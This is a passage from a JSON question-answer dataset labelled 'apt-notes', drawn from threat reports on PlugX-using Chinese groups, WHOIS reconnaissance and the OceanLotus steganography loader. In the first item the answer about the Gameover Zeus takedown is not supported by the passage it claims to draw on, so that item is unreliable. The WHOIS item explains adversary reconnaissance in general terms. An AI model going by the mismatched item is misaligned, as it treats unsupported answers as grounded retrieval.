In 2014, unpredictable events such as the Malaysia Airlines incidents and increased unrest in Ukraine drove campaigns more than planned events such as the World Cup or the G20 Summit.\n\u2022 Malicious activity related to elections in Ukraine and Hong Kong underscore the threat state-sponsored adversaries (and possibly hacktivist or nationalist actors) pose to democratic processes.\n\u2022 CrowdStrike reported on a number of new, sophisticated adversaries from China and Russia such  as HURRICANE PANDA, GOTHIC PANDA,  FANCY BEAR, and BERSERK BEAR.\nMedium Headline: State of the Union:\nDuring 2014, CrowdStrike Intelligence observed significant activity from 39 state-sponsored and nationalist adversaries targeting numerous verticals all over the globe. The charts below provide a high-level illustration of this targeting. There are a few takeaways from this data.\nVietnam and GOBLIN PANDA were respectively the most targeted country and the most active adversary. From late spring through summer, GOBLIN PANDA conducted consistent targeted intrusion operations targeting organizations in Vietnam focused on tensions in the South China Sea. These campaigns relied primarily on spear phishing with malicious documents that dropped malware (mostly PlugX) along with Vietnamese-language decoy documents. The content of these decoys often came from documents produced by Vietnam's government, which indicates that the adversary possibly infiltrated the government's network and was using stolen documents in its operations. The frequency of GOBLIN PANDA's operations, and targeted activity aimed at Vietnam in general, tailed off in the final months of 2014, but the volume of activity in spring and summer was enough to push them to the top of CrowdStrike's targeting stats.\nObserved AdversAry Activity during 2014\n\u25a0 GOBLIN PANDA\n\u25a0 VIXeN PANDA\n\u25a0 DeeP PANDA\n\u25a0 eMISSARy PANDA\n\u25a0 eNeRGeTIC BeAR\n\u25a0 PIRATe PANDA\n\u25a0 FLyING KITTeN\n\u25a0 NUMBeReD PANDA\n\u25a0 LOTUS PANDA\n\u25a0 VICeROy TIGeR\n\u25a0 eXTReMe JACKAL\n\u25a0 PITTy PANDA\n\u25a0 GOTHIC PANDA\n\u25a0 DeADeye JACKAL\n\u25a0 PReDATOR PANDA\n\u25a0 DyNAMITe PANDA\n\u25a0 TeMPeR PANDA\n\u25a0 PALe PANDA\n\u25a0 VIOLIN PANDA\n\u25a0 SILeNT CHOLIMMA\n\u25a0 HURRICANe PANDA\n\u25a0 SABRe PANDA\n\u25a0 SAMURAI PANDA\n\u25a0 DAGGeR PANDA\n\u25a0 AURORA PANDA\n\u25a0 MAVeRICK PANDA\n\u25a0 KeyHOLe PANDA\n\u25a0 STONe PANDA\n\u25a0 SPICy PANDA\nMedium Headline: State of the Union:\nsignificAnt tArgeting by cOuntry in 2014\nPlugX was by far the most used malware variant for targeted activity during 2014. It proliferated greatly amongst China-based targeted intrusion adversaries and now appears to be the tool of choice for many. The malware has been around for years and has been used by multiple Chinese actors for quite some time; however, the frequency of PlugX use during 2014 revealed just how prominent it is.\nPlugX is used by both more advanced China-based adversaries such as AURORA PANDA and adversaries of a lower level of sophistication such as GOBLIN PANDA. The reason for its prevalence is not clear. It is possible that there is a central malware dissemination channel supplying many Chinese adversaries and this is why so many groups are now using it. It is also possible that groups not using it in the past were more recently able to obtain it via the underground or public malware repositories.\nMedium Headline: State of the Union:\nThe stats below also reflect a wide range of other malicious cyber activity associated with numerous other events. The conflict in Ukraine resulted in targeted intrusion and other activity from both Russia-based and China-based adversaries. Adversaries with a nexus to Iran were also very active in 2014 targeting western government entities as well as private organizations, particularly in the defense sector. elections were also heavily targeted in 2014 both in Ukraine and in Hong Kong, where the Umbrella Revolution garnered a great deal of attention from Chinese actors. These and a number of other topics are covered in more detail in the sections below.\n\nWhat was the significance of the disruption of the Gameover Zeus botnet and CryptoLocker malware in May 2014?",
    "output": "The disruption of the Gameover Zeus botnet and CryptoLocker malware in May 2014 was significant because it provided law enforcement with a critical pause in adversary activity. This pause allowed authorities to levy charges and take legal action to permanently impact the malware, demonstrating the effectiveness of coordinated efforts between law enforcement and cybersecurity researchers in combating cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How can adversaries utilize Search Open Technical Databases: WHOIS to gather information about a target organization, such as Tranchulas, and what specific details can be obtained from WHOIS data to facilitate further reconnaissance or exploitation?",
    "output": "Adversaries can use Search Open Technical Databases: WHOIS to gather information about a target organization, such as Tranchulas, by querying public WHOIS data for details about their registered domain. This can reveal actionable information such as assigned IP blocks, contact information, and DNS nameservers. In the case of Tranchulas, WHOIS data could potentially reveal information about their hosting provider, VPSNOC, and its connection to Digital Linx, a Pakistan-based hosting company. This information could be used to identify potential vulnerabilities in Tranchulas' infrastructure or to establish a trusted relationship with the organization. Furthermore, WHOIS data could also provide insight into Tranchulas' business operations, such as their address and contact information, which could be used to facilitate phishing attacks or other forms of social engineering. By analyzing WHOIS data, adversaries can gain valuable information about a target organization's online presence and use it to inform further reconnaissance or exploitation efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nWhile continuing to monitor activity of the OceanLotus APT Group, BlackBerry Cylance researchers uncovered a novel payload loader that utilizes steganography to read an encrypted payload concealed within a .png image file. The steganography algorithm appears to be bespoke and utilizes a least significant bit approach to minimize visual differences when compared with the original image to prevent analysis by discovery tools. Once decoded, decrypted, and executed, an obfuscated loader will load one of the APT32 backdoors. Thus far, BlackBerry Cylance has observed two backdoors being used in combination with the steganography loader \u2013 a version of Denes backdoor (bearing similarities to the one described by ESET), and an updated version of Remy backdoor. However, this can be easily modified by the threat actor to deliver other malicious payloads. The complexity of the shellcode and loaders shows the group continues to invest heavily in development of bespoke tooling.\nThis white paper describes the steganography algorithm used in two distinct loader variants and looks at the launcher of the backdoor that was encoded in one of the .png cover images.\n\nBased on the above text, answer a question. How does the OceanLotus APT Group utilize steganography in its payload delivery mechanism, and why is this technique particularly effective against discovery tools?",
    "output": "The OceanLotus APT Group employs a novel payload loader that uses steganography to hide an encrypted payload within a .png image file. The steganography algorithm is custom-made and leverages a least significant bit approach to minimize visual discrepancies between the original and altered images. This technique is effective against discovery tools because it makes the hidden data nearly imperceptible, reducing the likelihood of detection through visual inspection or automated analysis. Once the payload is decoded, decrypted, and executed, an obfuscated loader loads one of the APT32 backdoors, such as a version of the Denes backdoor or an updated version of the Remy backdoor. This sophisticated method demonstrates the group's investment in developing bespoke tooling to evade detection and enhance the effectiveness of their attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  }
]